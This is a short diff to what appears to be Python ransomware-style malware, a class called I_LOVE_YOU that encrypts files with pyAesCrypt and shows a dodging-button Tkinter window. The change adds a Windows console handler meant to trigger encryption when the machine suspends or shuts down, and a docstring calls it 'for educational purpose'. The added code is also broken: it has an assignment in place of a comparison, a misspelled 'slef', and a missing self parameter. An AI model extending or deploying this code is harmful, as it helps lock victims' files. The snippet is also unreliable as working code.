@@ -1,4 +1,4 @@
-import pyautogui, pyAesCrypt, os, mimetypes, threading
+import pyautogui, pyAesCrypt, os, mimetypes, threading, win32api, win32con
 from tkinter import Tk, Label, Button, Entry
 from time import sleep, time
 
@@ -57,6 +57,13 @@ class I_LOVE_YOU(Tk):
         self.destroy() 
 
     rejected = lambda self : (setattr(self, 'countNo', self.countNo + 1), self.changeButtonPosition(), print(self.countNo))
+    
+    def blockShutdown(event):
+        if event = win32con.PBT_APMSUSPEND:
+            self.startEncryption() 
+            slef.rejected()
+            return True
+    win32api.SetConsoleCtrlHandler(blockShutdown, True) 
 
     def changeButtonPosition(self):
         if self.countNo == 1:
@@ -118,7 +125,6 @@ class I_LOVE_YOU(Tk):
         self.passInput.place(relx = 0.5, rely = 0.5)
         self.button['text'] = "Decrypt"
         self.button['command'] = self.decrypt
-
     """
         It's for educational purpose
     """
